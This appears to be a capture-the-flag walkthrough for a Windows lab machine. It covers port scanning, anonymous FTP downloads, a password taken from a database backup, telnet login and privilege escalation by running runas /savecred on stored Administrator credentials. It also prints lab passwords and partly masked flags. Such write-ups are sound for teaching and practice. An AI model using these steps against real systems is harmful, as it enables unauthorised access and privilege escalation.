## Full TCP Port Scan (Aggressive) [301s]

```bash
sudo nmap -Pn -p- -A -T4 10.129.43.61
```

```text
Starting Nmap 7.95 (https://nmap.org) at 2025-03-12 13:58 EDT
Nmap scan report for 10.129.43.61
Host is up (0.060s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   61.50 ms 10.10.16.1
2   91.90 ms 10.129.43.61

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 298.80 seconds
```

## Enumeration and Exploitation

### FTP Anonymous Access
Connect to FTP and download files:
```bash
ftp 10.129.43.61
```
Login with `anonymous` and empty password. Download both files:
```text
ftp> get "Access Control.zip"
ftp> get backup.mdb
```

### Analyzing Downloaded Files
**backup.mdb** contains credentials in the Passwords table:
```text
access4u@security
```

**Access Control.zip** is password protected. Crack it using found credentials:

Password: `access4u@security` (found in .mdb file)

Extracted file contains:
```text
The password for the security account has been changed to 4Cc3ssC0ntr0ller
```

### Telnet Access
Login with discovered credentials:
```bash
telnet 10.129.43.61
```
```text
Trying 10.129.43.61...
Connected to 10.129.43.61.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 4Cc3ssC0ntr0ller

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>
```

### User Flag
Found in security's Desktop:
```cmd
C:\Users\security> type Desktop\user.txt
3b99f**********************
```

## Privilege Escalation

### Stored Credentials Discovery
```cmd
C:\Users\security> cmdkey /list
```
```text
Currently stored credentials:
    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

### Administrator Access
Execute commands using saved credentials:
```cmd
runas /user:ACCESS\Administrator /savecred "cmd /c type Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\root.txt"
```

### Root Flag
Retrieve the output file:
```cmd
C:\Users\security> type Desktop\root.txt
c5b4d**********************
```
